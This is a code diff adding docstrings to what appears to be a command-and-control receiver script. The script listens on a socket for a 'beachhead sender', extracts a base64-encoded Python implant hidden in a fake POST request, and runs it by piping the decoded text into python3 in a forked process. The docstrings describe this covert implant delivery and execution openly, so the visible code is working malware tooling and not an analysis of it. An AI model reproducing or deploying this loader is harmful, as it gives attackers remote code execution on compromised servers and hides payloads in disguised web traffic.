@@ -8,6 +8,8 @@ PORT = 8081
 
 
 def accept_connection():
+    """Accept a connection from the beachhead sender and return the data received"""
+
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     sock.bind((HOST, PORT))
     sock.listen(1)
@@ -25,6 +27,12 @@ def accept_connection():
 
 
 def parse_cnc(data):
+    """Parse the data received from the beachhead sender and return the implant
+
+    The implant is base64 encoded and embedded as an attribute in a fake POST request.  The function
+    extracts the implant from the request and returns the base64 encoded python code for the implant.
+    """
+
     data = data.decode("utf-8")
 
     # Upload is the first part of the data section of the post request
@@ -43,6 +51,12 @@ def parse_cnc(data):
 
 
 def execute_cnc(implant):
+    """Execute the implant on the server
+
+    The implant is base64 encoded python code.  This function decodes the implant and executes it
+    using python3.
+    """
+
     command = "echo " + implant + " | base64 -d | python3"
 
     # Fork the process and execute the implant.  Allows the implant to run
